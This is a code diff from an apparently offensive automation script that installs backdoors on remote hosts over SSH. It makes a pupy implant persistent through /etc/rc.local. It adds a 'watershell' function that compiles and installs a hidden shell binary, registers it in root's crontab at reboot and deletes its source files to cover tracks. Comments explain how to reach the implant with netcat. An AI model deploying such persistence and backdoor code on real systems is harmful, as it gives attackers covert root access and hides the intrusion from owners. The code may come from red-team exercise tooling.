@@ -39,4 +39,28 @@ def backdoor_pupy(connect):
     connect.sudo("sh -c 'printf \"#!/bin/bash\n/bin/./pupy\nexit 0\" > /etc/rc.local && /bin/./pupy'")
     connect.sudo('/bin/./pupy')
 
+
+def backdoor_empire_ubuntu(connect):
+    pass
+
+
+def watershell(connect):
+    connect.put('UploadFiles/watershell/watershell.c')
+    connect.put('UploadFiles/watershell/watershell.h')
+    connect.sudo('gcc watershell.c -o watershell')
+    connect.sudo('mv watershell /bin/')
+    connect.sudo('nohup watershell &')
+    connect.run("sh -c 'echo \"@reboot /bin/watershell\" > water.txt'")
+    connect.sudo("crontab -u root water.txt")
+    connect.run("rm water.txt watershell.c watershell.h")
+
+
+
+
+
+# nc <IP> <port> -u
+# run: mkdir pwned
+# Note: You will not see any output
+
+
 # Up to implementation: merlin
